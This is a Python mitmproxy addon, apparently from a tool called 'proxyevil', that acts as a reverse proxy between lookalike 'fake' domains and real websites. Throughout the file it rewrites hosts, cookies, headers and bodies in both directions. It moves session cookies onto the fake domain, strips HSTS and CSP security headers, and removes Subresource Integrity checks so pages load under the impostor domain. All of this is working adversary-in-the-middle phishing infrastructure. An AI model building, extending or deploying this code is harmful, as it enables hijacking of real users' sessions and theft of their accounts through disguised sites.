"""
addon.py — mitmproxy addon: bidirectional domain rewriter.

Wires together AliasMap, codec, and Stats to rewrite every HTTP/HTTPS
flow that involves a known fake domain.
"""

import logging
import re
import time
from pathlib import Path
from typing import Optional

from mitmproxy import http as mhttp  # type: ignore

from alias_map import AliasMap
from codec     import decompress, recompress
from stats     import Stats

log = logging.getLogger("proxyevil.addon")

_BINARY_TYPES = {
    "image/", "video/", "audio/", "font/",
    "application/octet-stream", "application/pdf",
    "application/zip", "application/wasm",
}
_DEFAULT_BODY_SIZE_LIMIT = 10 * 1024 * 1024   # 10 MB
_SRI_RE = re.compile(r"""\s+integrity=(?:"[^"]*"|'[^']*')""")

# Key used to stash fake/real pair in flow.metadata during request()
# so response() doesn't have to re-derive it from the already-rewritten host.
_META_FAKE = "proxyevil.fake"
_META_REAL = "proxyevil.real"


class DomainAliasAddon:
    """Bidirectional domain rewriter registered as a mitmproxy addon."""

    def __init__(self, alias_map: AliasMap, cfg: dict, stats: Stats):
        self.aliases   = alias_map
        self.cfg       = cfg     # kept by reference so hot-reload is instant
        self.stats     = stats
        self._log_fh: Optional[object] = None   # open file handle for access log
        self._log_path: Optional[Path] = None
        self._cfg_gen  = 0   # bumped on hot-reload to invalidate derived caches
        self._init_access_log()

    def _init_access_log(self):
        """Open the rolling access log if 'access_log' is enabled in config.

        Safe to call on hot-reload: closes any previously open handle before
        re-opening so we never leak file descriptors.
        """
        if self._log_fh is not None:
            try:
                self._log_fh.close()
            except OSError:
                pass
            self._log_fh  = None
            self._log_path = None

        if not self.cfg.get("access_log", False):
            return
        data_dir = Path(self.cfg.get("data_dir", "evil_data"))
        data_dir.mkdir(parents=True, exist_ok=True)
        path = data_dir / "access.log"
        try:
            self._log_fh   = open(path, "a", encoding="utf-8", buffering=1)  # line-buffered
            self._log_path = path
            log.info(f"[ACCESS] logging to {path}")
        except OSError as exc:
            log.warning(f"[ACCESS] could not open log file {path}: {exc}")

    def _write_access(self, method: str, fake: str, path: str, status: int, size: int):
        """Append one access-log line if the log is open."""
        if self._log_fh is None:
            return
        ts = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())  # UTC, ISO-8601
        try:
            self._log_fh.write(f"{ts}\t{method}\t{fake}\t{path}\t{status}\t{size}\n")
        except OSError as exc:
            log.debug(f"[ACCESS] write failed: {exc}")

    # ── live config properties ────────────────────────────────────────────────

    @property
    def rw(self) -> dict:
        return self.cfg.get("rewrite", {})

    # strip_hdrs: rebuilt on demand and cached; call _refresh_strip_hdrs() on
    # hot-reload so we don't pay 10 × .lower() + set() per response.
    def _refresh_strip_hdrs(self):
        self._strip_hdrs_cache: set = {h.lower() for h in self.cfg.get("strip_headers", [])}
        self._strip_hdrs_gen = self._cfg_gen

    @property
    def strip_hdrs(self) -> set:
        if not hasattr(self, "_strip_hdrs_cache") or getattr(self, "_strip_hdrs_gen", -1) != self._cfg_gen:
            self._refresh_strip_hdrs()
        return self._strip_hdrs_cache

    def notify_reload(self):
        """Call after a hot-reload so cached derived values are invalidated."""
        self._cfg_gen += 1
        self._init_access_log()  # re-opens access log if path/enable changed

    @property
    def body_size_limit(self) -> int:
        return int(self.cfg.get("max_body_bytes", _DEFAULT_BODY_SIZE_LIMIT))

    # ── outgoing: fake → real ─────────────────────────────────────────────────

    def request(self, flow: mhttp.HTTPFlow):
        host = flow.request.host
        real = self.aliases.real_for(host)
        if real is None:
            return

        # Stash the fake/real pair before we overwrite host, so response()
        # can reliably retrieve it without relying on the mutated host value.
        flow.metadata[_META_FAKE] = host
        flow.metadata[_META_REAL] = real

        log.info(f"[REQ]  {flow.request.method} {host}{flow.request.path}  →  {real}")
        flow.request.host            = real
        flow.request.headers["Host"] = real

        # Snapshot cfg-derived values once to avoid repeated dict lookups.
        rw = self.rw

        if rw.get("headers", True):
            for hdr in ("referer", "origin"):
                val = flow.request.headers.get(hdr, "")
                if val:
                    flow.request.headers[hdr] = self.aliases.rewrite_fake_to_real(val)

        if rw.get("cookies", True):
            raw_cookie = flow.request.headers.get("cookie", "")
            if raw_cookie:
                flow.request.headers["cookie"] = self.aliases.rewrite_fake_to_real(raw_cookie)

        # Rewrite request body — handles both plain and compressed bodies
        if flow.request.content:
            ct  = flow.request.headers.get("content-type",     "").lower()
            enc = flow.request.headers.get("content-encoding", "").lower()
            if any(t in ct for t in ("json", "form", "text", "xml")):
                try:
                    raw = flow.request.content
                    if enc and enc != "identity":
                        decompressed, did_decompress = decompress(raw, enc)
                    else:
                        decompressed, did_decompress = raw, False

                    body_text = decompressed.decode("utf-8", errors="replace")
                    new_text  = self.aliases.rewrite_fake_to_real(body_text)
                    if new_text != body_text:
                        new_bytes = new_text.encode("utf-8")
                        if did_decompress and enc:
                            new_bytes = recompress(new_bytes, enc)
                        elif did_decompress:
                            del flow.request.headers["content-encoding"]
                        flow.request.content                   = new_bytes
                        flow.request.headers["content-length"] = str(len(new_bytes))
                except Exception as exc:
                    log.debug(f"[REQ body] {exc}")
                    self.stats.error(flow.metadata.get(_META_FAKE, host))

    # ── incoming: real → fake ─────────────────────────────────────────────────

    def response(self, flow: mhttp.HTTPFlow):
        # Read fake/real from metadata stamped in request() — never from the
        # mutated flow.request.host, which is already the real upstream domain.
        fake = flow.metadata.get(_META_FAKE)
        if fake is None:
            return

        # Snapshot cfg-derived values once per response to avoid repeated reads.
        rw         = self.rw
        strip_hdrs = self.strip_hdrs

        # Strip security/HSTS/CSP headers that would break the fake domain
        for hdr in list(flow.response.headers.keys()):
            if hdr.lower() in strip_hdrs:
                del flow.response.headers[hdr]

        if rw.get("headers", True):
            self._rewrite_response_headers(flow)

        if rw.get("cookies", True):
            self._rewrite_cookies(flow, fake)

        try:
            bytes_rw = self._rewrite_body(flow, rw)
        except Exception as exc:
            log.warning(f"[BODY] unexpected error for {fake}: {exc}")
            self.stats.error(fake)
            bytes_rw = 0

        self.stats.hit(fake, bytes_rw)
        self._write_access(
            flow.request.method,
            fake,
            flow.request.path,
            flow.response.status_code,
            len(flow.response.content or b""),
        )

    # ── helpers ───────────────────────────────────────────────────────────────

    def _rewrite_response_headers(self, flow: mhttp.HTTPFlow):
        for hdr in ("location", "refresh", "link", "content-location",
                    "access-control-allow-origin"):
            val = flow.response.headers.get(hdr, "")
            if val:
                new_val = self.aliases.rewrite_real_to_fake(val)
                if new_val != val:
                    flow.response.headers[hdr] = new_val
                    log.debug(f"[HDR] {hdr}: {val!r} → {new_val!r}")

    def _rewrite_cookies(self, flow: mhttp.HTTPFlow, fake_base: str):
        raw_cookies = flow.response.headers.get_all("set-cookie")
        if not raw_cookies:
            return

        fake_is_http = flow.request.scheme == "http"
        new_cookies  = []

        for raw in raw_cookies:
            first_semi = raw.find(";")
            if first_semi == -1:
                new_cookies.append(self.aliases.rewrite_real_to_fake(raw))
                continue
            name_val     = raw[:first_semi]
            attrs        = raw[first_semi:]
            new_name_val = self.aliases.rewrite_real_to_fake(name_val)
            new_attrs    = re.sub(
                r'(?i)(;\s*domain=)[^;]*',
                f'; Domain={fake_base}',
                attrs,
            )
            if fake_is_http:
                new_attrs = re.sub(r'(?i);\s*Secure\b', '', new_attrs)
            elif not re.search(r'(?i);\s*Secure\b', new_attrs):
                # Add Secure when the fake domain is HTTPS but upstream omitted it.
                new_attrs += "; Secure"
            if not re.search(r'(?i);\s*SameSite=', new_attrs):
                new_attrs += "; SameSite=Lax"
            new_cookies.append(new_name_val + new_attrs)

        while "set-cookie" in flow.response.headers:
            del flow.response.headers["set-cookie"]
        for c in new_cookies:
            flow.response.headers.add("set-cookie", c)

    def _rewrite_body(self, flow: mhttp.HTTPFlow, rw: dict) -> int:
        """Decompress → rewrite domain refs → recompress. Returns delta bytes rewritten."""
        if not flow.response.content:
            return 0

        ct  = flow.response.headers.get("content-type",     "").lower()
        enc = flow.response.headers.get("content-encoding", "").lower()

        if any(ct.startswith(bt) for bt in _BINARY_TYPES):
            return 0

        is_html = "text/html"  in ct
        is_js   = "javascript" in ct or "ecmascript" in ct
        is_css  = "text/css"   in ct
        is_json = "json"       in ct
        is_text = "text/"      in ct or "xml" in ct

        should_rewrite = (
            (is_html and rw.get("html",  True)) or
            (is_js   and rw.get("js",    True)) or
            (is_css  and rw.get("css",   True)) or
            (is_json and rw.get("json",  True)) or
            is_text
        )
        if not should_rewrite:
            return 0

        raw = flow.response.content
        if len(raw) > self.body_size_limit:
            log.debug(f"[BODY] skipping {len(raw) // 1024}KB body (over limit)")
            return 0

        if enc and enc != "identity":
            decompressed, did_decompress = decompress(raw, enc)
        else:
            decompressed, did_decompress = raw, False

        active_enc = enc if (enc and enc != "identity" and did_decompress) else ""

        # Domain pre-check: scan byte needles before decoding the full body.
        # _real_needles are ASCII-encoded domain names; bytes.find() is safe and
        # far cheaper than a full regex scan when there's nothing to rewrite.
        dec_lower = decompressed.lower()
        if not any(n in dec_lower for n in self.aliases._real_needles):
            return 0

        charset = "utf-8"
        if "charset=" in ct:
            charset = ct.split("charset=")[-1].split(";")[0].strip() or "utf-8"

        try:
            text = decompressed.decode(charset, errors="replace")
        except Exception:
            text = decompressed.decode("utf-8", errors="replace")

        # SRI stripping happens AFTER the pre-check confirms real domains exist
        # in the body, avoiding a full regex scan of megabytes for nothing.
        if is_html and rw.get("html", True):
            text = _SRI_RE.sub("", text)

        new_text = self.aliases.rewrite_real_to_fake(text)
        if new_text == text:
            return 0

        try:
            new_bytes = new_text.encode(charset, errors="replace")
        except Exception:
            new_bytes = new_text.encode("utf-8", errors="replace")

        if active_enc:
            new_bytes = recompress(new_bytes, active_enc)
        elif did_decompress:
            if "content-encoding" in flow.response.headers:
                del flow.response.headers["content-encoding"]

        flow.response.content                   = new_bytes
        flow.response.headers["content-length"] = str(len(new_bytes))

        delta = len(new_text) - len(text)
        log.debug(f"[BODY] {ct[:30]}  {len(raw)}B → {len(new_bytes)}B  Δ{delta:+d} chars")
        return max(0, delta)
